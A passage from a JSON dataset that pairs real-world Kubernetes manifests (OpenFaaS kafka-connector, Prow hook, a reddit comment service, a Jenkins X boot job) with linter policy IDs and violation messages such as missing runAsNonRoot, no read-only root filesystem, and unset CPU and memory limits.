    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kafka\n    component: kafka-connector\n  name: kafka-connector\n  namespace: openfaas\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kafka\n      component: kafka-connector\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: kafka\n        component: kafka-connector\n    spec:\n      containers:\n      - name: kafka\n        image: openfaas/kafka-connector:0.3.4\n        env:\n        - name: gateway_url\n          value: http://gateway.openfaas:8080\n        - name: topics\n          value: faas-request,\n        - name: print_response\n          value: 'true'\n        - name: print_response_body\n          value: 'true'\n        - name: basic_auth\n          value: 'true'\n        - name: secret_mount_path\n          value: /var/secrets/\n        - name: topic_delimiter\n          value: ','\n        - name: asynchronous_invocation\n          value: 'true'\n        volumeMounts:\n        - name: auth\n          readOnly: true\n          mountPath: /var/secrets/\n      volumes:\n      - name: auth\n        secret:\n          secretName: basic-auth\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kafka\" does not have a read-only root file system"
  },
  {
    "id": "11409",
    "manifest_path": "data/manifests/the_stack_sample/sample_4396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kafka\n    component: kafka-connector\n  name: kafka-connector\n  namespace: openfaas\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kafka\n      component: kafka-connector\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: kafka\n        component: kafka-connector\n    spec:\n      containers:\n      - name: kafka\n        image: openfaas/kafka-connector:0.3.4\n        env:\n        - name: gateway_url\n          value: http://gateway.openfaas:8080\n        - name: topics\n          value: faas-request,\n        - name: print_response\n          value: 'true'\n        - name: print_response_body\n          value: 'true'\n        - name: basic_auth\n          value: 'true'\n        - name: secret_mount_path\n          value: /var/secrets/\n        - name: topic_delimiter\n          value: ','\n        - name: asynchronous_invocation\n          value: 'true'\n        volumeMounts:\n        - name: auth\n          readOnly: true\n          mountPath: /var/secrets/\n      volumes:\n      - name: auth\n        secret:\n          secretName: basic-auth\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kafka\" is not set to runAsNonRoot"
  },
  {
    "id": "11410",
    "manifest_path": "data/manifests/the_stack_sample/sample_4396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kafka\n    component: kafka-connector\n  name: kafka-connector\n  namespace: openfaas\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kafka\n      component: kafka-connector\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: kafka\n        component: kafka-connector\n    spec:\n      containers:\n      - name: kafka\n        image: openfaas/kafka-connector:0.3.4\n        env:\n        - name: gateway_url\n          value: http://gateway.openfaas:8080\n        - name: topics\n          value: faas-request,\n        - name: print_response\n          value: 'true'\n        - name: print_response_body\n          value: 'true'\n        - name: basic_auth\n          value: 'true'\n        - name: secret_mount_path\n          value: /var/secrets/\n        - name: topic_delimiter\n          value: ','\n        - name: asynchronous_invocation\n          value: 'true'\n        volumeMounts:\n        - name: auth\n          readOnly: true\n          mountPath: /var/secrets/\n      volumes:\n      - name: auth\n        secret:\n          secretName: basic-auth\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kafka\" has cpu request 0"
  },
  {
    "id": "11411",
    "manifest_path": "data/manifests/the_stack_sample/sample_4396.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kafka\n    component: kafka-connector\n  name: kafka-connector\n  namespace: openfaas\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: kafka\n      component: kafka-connector\n  template:\n    metadata:\n      annotations:\n        prometheus.io.scrape: 'false'\n      labels:\n        app: kafka\n        component: kafka-connector\n    spec:\n      containers:\n      - name: kafka\n        image: openfaas/kafka-connector:0.3.4\n        env:\n        - name: gateway_url\n          value: http://gateway.openfaas:8080\n        - name: topics\n          value: faas-request,\n        - name: print_response\n          value: 'true'\n        - name: print_response_body\n          value: 'true'\n        - name: basic_auth\n          value: 'true'\n        - name: secret_mount_path\n          value: /var/secrets/\n        - name: topic_delimiter\n          value: ','\n        - name: asynchronous_invocation\n          value: 'true'\n        volumeMounts:\n        - name: auth\n          readOnly: true\n          mountPath: /var/secrets/\n      volumes:\n      - name: auth\n        secret:\n          secretName: basic-auth\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kafka\" has memory limit 0"
  },
  {
    "id": "11412",
    "manifest_path": "data/manifests/the_stack_sample/sample_4397.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: my-service\nspec:\n  selector:\n    app: nginx1.14.2\n  ports:\n  - name: http\n    port: 80\n    nodePort: 30080\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx1.14.2])"
  },
  {
    "id": "11413",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11414",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11415",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "11416",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "11417",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11418",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "11419",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "11420",
    "manifest_path": "data/manifests/the_stack_sample/sample_4398.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210211-72696ce111\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: config\n        configMap:\n          name: config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "11421",
    "manifest_path": "data/manifests/the_stack_sample/sample_4399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment-deployment\n  labels:\n    app: reddit\n    component: comment\n    ui-comment: 'true'\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n        ui-comment: 'true'\n    spec:\n      containers:\n      - image: matveevelli/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"comment\" is using an invalid container image, \"matveevelli/comment\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11422",
    "manifest_path": "data/manifests/the_stack_sample/sample_4399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment-deployment\n  labels:\n    app: reddit\n    component: comment\n    ui-comment: 'true'\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n        ui-comment: 'true'\n    spec:\n      containers:\n      - image: matveevelli/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11423",
    "manifest_path": "data/manifests/the_stack_sample/sample_4399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment-deployment\n  labels:\n    app: reddit\n    component: comment\n    ui-comment: 'true'\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n        ui-comment: 'true'\n    spec:\n      containers:\n      - image: matveevelli/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"comment\" does not have a read-only root file system"
  },
  {
    "id": "11424",
    "manifest_path": "data/manifests/the_stack_sample/sample_4399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment-deployment\n  labels:\n    app: reddit\n    component: comment\n    ui-comment: 'true'\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n        ui-comment: 'true'\n    spec:\n      containers:\n      - image: matveevelli/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"comment\" is not set to runAsNonRoot"
  },
  {
    "id": "11425",
    "manifest_path": "data/manifests/the_stack_sample/sample_4399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment-deployment\n  labels:\n    app: reddit\n    component: comment\n    ui-comment: 'true'\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n        ui-comment: 'true'\n    spec:\n      containers:\n      - image: matveevelli/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"comment\" has cpu request 0"
  },
  {
    "id": "11426",
    "manifest_path": "data/manifests/the_stack_sample/sample_4399.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: comment-deployment\n  labels:\n    app: reddit\n    component: comment\n    ui-comment: 'true'\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: reddit\n      component: comment\n  template:\n    metadata:\n      name: comment\n      labels:\n        app: reddit\n        component: comment\n        ui-comment: 'true'\n    spec:\n      containers:\n      - image: matveevelli/comment\n        name: comment\n        env:\n        - name: COMMENT_DATABASE_HOST\n          value: comment-db\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"comment\" has memory limit 0"
  },
  {
    "id": "11427",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11428",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git-clone\" does not have a read-only root file system"
  },
  {
    "id": "11429",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        - name: HTTP_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: HTTPS_PROXY\n          value: http://proxy.esl.cisco.com:8080/\n        - name: http_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: https_proxy\n          value: http://proxy.esl.cisco.com:8080/\n        - name: NO_PROXY\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        - name: no_proxy\n          value: 10.30.196.27,localhost,127.0.0.1,.cisco.com,.local,0,1,2,3,4,5,6,7,8,9\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        image: ghcr.io/jenkins-x/jx-boot:3.2.77\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job\" does not have a read-only root file system"
  },
  {
    "id": "11430",
    "manifest_path": "data/manifests/the_stack_sample/sample_4400.yaml",
